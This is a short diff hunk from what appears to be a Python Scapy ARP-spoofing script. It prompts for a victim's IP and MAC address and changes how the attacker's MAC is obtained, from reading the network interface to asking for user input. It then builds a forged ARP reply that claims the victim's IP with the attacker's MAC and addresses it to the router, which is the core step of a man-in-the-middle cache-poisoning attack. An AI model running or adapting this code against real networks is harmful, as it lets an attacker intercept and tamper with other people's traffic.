@@ -12,7 +12,7 @@ victimIp = input("Victim IP: ")
 victimMac = input("Victim Mac: ")
 #victimMac = "00:00:00:00:00:02"
 
-attackerMac = get_if_hwaddr('eth0.62')
+attackerMac = input("Attacker Mac: ")
 
 #attackerMac = "00:00:00:00:00:03"
 packet = ARP(op = 2, hwsrc=attackerMac, psrc=victimIp, hwdst=routerMac,
